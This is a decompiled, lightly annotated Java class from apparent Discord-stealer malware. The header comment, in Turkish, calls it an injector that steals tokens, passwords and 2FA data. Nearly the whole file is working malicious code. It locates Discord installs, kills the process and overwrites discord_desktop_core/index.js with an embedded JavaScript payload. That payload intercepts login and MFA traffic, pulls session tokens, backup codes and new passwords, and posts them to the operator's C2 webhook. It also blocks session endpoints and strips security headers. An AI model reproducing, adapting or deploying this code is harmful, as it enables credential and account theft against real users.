/*\n * ========================================\n * DEOBFUSCATED: DiscordInjector.java\n * Original: c/b.java\n * ----------------------------------------\n * Discord enjektörü - discord_desktop_core/index.js yi değiştirir, token/şifre/2FA çalar\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import a.Main;
import java.io.File;
import java.io.FileWriter;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

public class b {
    private static final String INJECT_MARKER = "/* __SP_INJECTED__ */";

    public static boolean injectAll() {
        try {
            Object object;
            List<File> list = b.findCoreModules();
            if (list.isEmpty()) {
                return false;
            }
            boolean bl = true;
            for (File object2 : list) {
                File file = new File(object2, "index.js");
                if (!file.isFile()) {
                    bl = false;
                    break;
                }
                try {
                    object = new String(Files.readAllBytes(file.toPath()), StandardCharsets.UTF_8);
                    if (((String)object).contains(a)) continue;
                    bl = false;
                    break;
                }
                catch (Exception fileWriter) {
                    bl = false;
                    break;
                }
            }
            if (bl) {
                return true;
            }
            b.killDiscords();
            String string = b.getPayload(Main.C2_URL, Main.LICENSE_KEY);
            for (File file : list) {
                try {
                    object = new File(file, "index.js");
                    FileWriter exception = new FileWriter((File)object);
                    exception.write(string);
                    exception.close();
                }
                catch (Exception exception) {}
            }
            Thread.sleep(1500L);
            b.restartDiscords();
            return true;
        }
        catch (Exception exception) {
            return false;
        }
    }

    private static void killDiscords() {
        String[] stringArray = new String[]{"Discord.exe", "DiscordCanary.exe", "DiscordPTB.exe", "DiscordDevelopment.exe"};
        for (String string : stringArray) {
            try {
                ProcessBuilder processBuilder = new ProcessBuilder("taskkill", "/F", "/IM", string, "/T");
                processBuilder.redirectErrorStream(true);
                Process process = processBuilder.start();
                process.waitFor(5L, TimeUnit.SECONDS);
                process.destroyForcibly();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        try {
            Thread.sleep(2000L);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void restartDiscords() {
        try {
            String string = System.getenv("LOCALAPPDATA");
            if (string == null) {
                return;
            }
            String[] stringArray = new String[]{"Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment"};
            String[] stringArray2 = new String[]{"Discord.exe", "DiscordCanary.exe", "DiscordPTB.exe", "DiscordDevelopment.exe"};
            for (int i2 = 0; i2 < stringArray.length; ++i2) {
                File file;
                File file2 = new File(string, stringArray[i2]);
                if (!file2.isDirectory() || !(file = new File(file2, "Update.exe")).isFile()) continue;
                try {
                    new ProcessBuilder(file.getAbsolutePath(), "--processStart", stringArray2[i2]).directory(file2).start();
                    continue;
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static List<File> findCoreModules() {
        ArrayList<File> arrayList = new ArrayList<File>();
        try {
            String string = System.getenv("LOCALAPPDATA");
            if (string == null) {
                return arrayList;
            }
            File[] fileArray = new File(string).listFiles();
            if (fileArray == null) {
                return arrayList;
            }
            for (File file : fileArray) {
                File[] fileArray2;
                String string2 = file.getName().toLowerCase();
                if (!string2.contains("discord") || !file.isDirectory() || (fileArray2 = file.listFiles(b::lambda$findCoreModules$0)) == null) continue;
                for (File file2 : fileArray2) {
                    File[] fileArray3;
                    File file3 = new File(file2, "modules");
                    if (!file3.isDirectory() || (fileArray3 = file3.listFiles()) == null) continue;
                    for (File file4 : fileArray3) {
                        File file5;
                        if (!file4.getName().startsWith("discord_desktop_core-") || !(file5 = new File(file4, "discord_desktop_core")).isDirectory()) continue;
                        arrayList.add(file5);
                    }
                }
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return arrayList;
    }

    private static String getPayload(String string, String string2) {
        String string3 = (string + "/v1/webhook").replace("\\", "\\\\").replace("'", "\\'");
        String string4 = string2.replace("\\", "\\\\").replace("'", "\\'");
        String string5 = "https://i.imgur.com/YYumsB0.png";
        String string6 = Main.OPERATOR_ID.replace("\\", "\\\\").replace("'", "\\'");
        return "/* __SP_INJECTED__ */\nprocess.env.NODE_TLS_REJECT_UNAUTHORIZED = \"0\";\nconst { BrowserWindow, session } = require(Buffer.from('656c656374726f6e', 'hex').toString());\nconst C = {\n    u: '" + string3 + "',\n    k: '" + string4 + "',\n    n: 'Supreme',\n    i: '" + string5 + "',\n    o: '" + string6 + "',\n    b: '" + string4 + "',\n    f: ['/auth/login', '/auth/register', '/mfa/totp', '/users/@me', '/auth/verify/view-backup-codes-challenge', '/mfa/codes-verification', '/mfa/codes']\n};\nlet pC = '', bP = '';\nconst hk = (emb) => {\n    try {\n        const p = JSON.stringify({ username: C.n, avatar_url: C.i, embeds: emb });\n        const u = new URL(C.u);\n        const H = require(u.protocol === 'https:' ? 'https' : 'http');\n        const r = H.request({ hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80), path: u.pathname + u.search, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(p), 'x-build-key': C.k } });\n        r.on('error', () => {});\n        r.write(p);\n        r.end();\n    } catch {}\n};\nconst ex = async (s, tO = 5000) => {\n    const ws = BrowserWindow.getAllWindows().filter(w => !w.isDestroyed() && w.isVisible());\n    if (ws.length === 0) return null;\n    try {\n        return await Promise.any(ws.map(w => {\n            return Promise.race([\n                w.webContents.executeJavaScript(s, true),\n                new Promise((_, rj) => setTimeout(() => rj(), tO))\n            ]).then(r => r ? r : Promise.reject());\n        }));\n    } catch { return null; }\n};\nconst gT = async () => await ex(`(()=>{try{let t=null;window.webpackChunkdiscord_app.push([[Math.random()],{},(r)=>{for(const m in r.c){const e=r.c[m]?.exports;if(e?.default?.getToken)t=e.default.getToken();else if(e?.getToken)t=e.getToken();if(typeof t==='string'&&t.length>20)return t;}}]);return t;}catch{return null;}})()`);\nconst gU = async (t) => {\n    if (!t) return null;\n    for (let i = 0; i < 5; i++) {\n        try {\n            const u = await ex(`(async()=>{\n                if(window.location.protocol!=='https:') return null;\n                try {\n                    const r = await fetch('https://discord.com/api/v9/users/@me', {headers: {'Authorization': '${t}'}});\n                    if (r.ok) return await r.json();\n                } catch { return null; }\n            })()`, 10000);\n            if (u && u.id) return u;\n        } catch {}\n        await new Promise(r => setTimeout(r, 800));\n    }\n    return null;\n};\nconst fBC = (cs) => {\n    if (!cs || cs.length === 0) return { ch1: 'N/A', ch2: '' };\n    const f = cs.map(c => {\n        const s = (typeof c === 'string' ? c : c.code).replace(/-/g, '');\n        return s.length === 8 ? s.slice(0, 4) + '-' + s.slice(4) : s;\n    });\n    const m = Math.ceil(f.length / 2);\n    return { ch1: f.slice(0, m).join('\\n'), ch2: f.slice(m).join('\\n') };\n};\nconst sCDP = () => {\n    const at = async () => {\n        try {\n            const w = BrowserWindow.getAllWindows().find(x => !x.isDestroyed());\n            if (!w) return setTimeout(at, 2000);\n            if (!w.webContents.debugger.isAttached()) {\n                try { w.webContents.debugger.attach('1.3'); } catch { return setTimeout(at, 3000); }\n            }\n            w.webContents.debugger.on('message', async (_, m, p) => {\n                if (m !== 'Network.responseReceived') return;\n                const u = p.response.url;\n                if (!C.f.some(i => u.includes(i))) return;\n                if (![200, 202, 204].includes(p.response.status)) return;\n                let d = {}, b = {};\n                try {\n                    const r = await w.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: p.requestId });\n                    d = JSON.parse(r.postData || '{}');\n                } catch {}\n                try {\n                    const r = await w.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: p.requestId });\n                    b = JSON.parse(r.body || '{}');\n                } catch {}\n                let t = b.token || null;\n                if (!t) {\n                    for (let i = 0; i < 8; i++) {\n                        t = await gT();\n                        if (t) break;\n                        await new Promise(r => setTimeout(r, 150));\n                    }\n                }\n                if (typeof t !== 'string') t = 'N/A';\n                const usr = await gU(t) || { username: 'Unknown', id: '0', avatar: '', email: 'N/A' };\n                const av = usr.avatar ? `https://cdn.discordapp.com/avatars/${usr.id}/${usr.avatar}.webp` : null;\n                if (u.includes('/login') || u.includes('/register')) {\n                    if (d.password) pC = d.password;\n                    if (b.mfa) return;\n                    const email = usr.email !== 'N/A' ? usr.email : (d.login || d.email || 'N/A');\n                    const username = usr.username !== 'Unknown' ? usr.username : (d.username || 'Unknown');\n                    hk([{\n                        author: { name: '@' + username, icon_url: av },\n                        description: u.includes('/login') ? '**Login Detected**' : '**Registration Detected**',\n                        color: 0xFF0000,\n                        thumbnail: av ? { url: av } : undefined,\n                        fields: [\n                            { name: 'Email', value: `\\`${email}\\``, inline: true },\n                            { name: 'Password', value: `\\`${d.password || pC || 'N/A'}\\``, inline: true },\n                            { name: 'Token', value: `\\`\\`\\`${t}\\`\\`\\``, inline: false }\n                        ],\n                        footer: { text: `${C.o} (${C.b})` }\n                    }]);\n                } else if (u.includes('/mfa/totp') && !u.includes('/enable')) {\n                    hk([{\n                        author: { name: '@' + usr.username, icon_url: av },\n                        description: '**2FA Login Detected**',\n                        color: 0xFF0000,\n                        thumbnail: av ? { url: av } : undefined,\n                        fields: [\n                            { name: 'Password', value: `\\`${pC || 'N/A'}\\``, inline: true },\n                            { name: 'Token', value: `\\`\\`\\`${t}\\`\\`\\``, inline: false }\n                        ],\n                        footer: { text: `${C.o} (${C.b})` }\n                    }]);\n                } else if (u.includes('/mfa/totp/enable') || u.includes('/mfa/codes-verification') || u.includes('/mfa/codes')) {\n                    const cs = b.backup_codes || [];\n                    const { ch1, ch2 } = fBC(cs);\n                    if (u.includes('/enable') || cs.length > 0 || d.key || d.secret) {\n                        hk([{\n                            author: { name: '@' + usr.username, icon_url: av },\n                            description: u.includes('/enable') ? '**2FA Enabled**' : '**2FA Codes Viewed**',\n                            color: 0xFF0000,\n                            thumbnail: av ? { url: av } : undefined,\n                            fields: [\n                                { name: 'Password', value: `\\`${bP || pC || 'N/A'}\\``, inline: true },\n                                { name: 'Secret', value: `\\`${d.secret || d.key || 'N/A'}\\``, inline: true },\n                                { name: 'Codes pt1', value: `\\`\\`\\`${ch1}\\`\\`\\``, inline: true },\n                                { name: 'Codes pt2', value: `\\`\\`\\`${ch2 || 'N/A'}\\`\\`\\``, inline: true },\n                                { name: 'Token', value: `\\`\\`\\`${t}\\`\\`\\``, inline: false }\n                            ],\n                            footer: { text: `${C.o} (${C.b})` }\n                        }]);\n                    }\n                } else if (u.includes('/view-backup-codes-challenge')) {\n                    if (d.password) bP = d.password;\n                } else if (d.new_password) {\n                    hk([{\n                        author: { name: '@' + usr.username, icon_url: av },\n                        description: '**Password Changed**',\n                        color: 0xFF0000,\n                        thumbnail: av ? { url: av } : undefined,\n                        fields: [\n                            { name: 'New Password', value: `\\`${d.new_password}\\``, inline: true },\n                            { name: 'Token', value: `\\`\\`\\`${t}\\`\\`\\``, inline: false }\n                        ],\n                        footer: { text: `${C.o} (${C.b})` }\n                    }]);\n                } else if (d.email && !d.new_password) {\n                    hk([{\n                        author: { name: '@' + usr.username, icon_url: av },\n                        description: '**Email Changed**',\n                        color: 0xFF0000,\n                        thumbnail: av ? { url: av } : undefined,\n                        fields: [\n                            { name: 'Old Email', value: `\\`${usr.email || 'N/A'}\\``, inline: true },\n                            { name: 'New Email', value: `\\`${d.email}\\``, inline: true },\n                            { name: 'Token', value: `\\`\\`\\`${t}\\`\\`\\``, inline: false }\n                        ],\n                        footer: { text: `${C.o} (${C.b})` }\n                    }]);\n                }\n            });\n            w.webContents.debugger.sendCommand('Network.enable');\n            w.on('closed', () => setTimeout(at, 5000));\n        } catch { setTimeout(at, 3000); }\n    };\n    setTimeout(at, 3000);\n};\nsCDP();\nsession.defaultSession.webRequest.onBeforeRequest(\n    { urls: ['wss://remote-auth-gateway.discord.gg/*', 'https://*/auth/sessions', 'https://*.discord.com/api/*/auth/sessions'] },\n    (_, cb) => cb({ cancel: true })\n);\nsession.defaultSession.webRequest.onHeadersReceived((d, cb) => {\n    delete d.responseHeaders['content-security-policy'];\n    delete d.responseHeaders['content-security-policy-report-only'];\n    cb({ responseHeaders: { ...d.responseHeaders, 'Access-Control-Allow-Headers': '*', 'Access-Control-Allow-Origin': '*' } });\n});\nmodule.exports = require('./core.asar');";
    }

    private static boolean lambda$findCoreModules$0(File file, String string) {
        return string.startsWith("app-");
    }
}

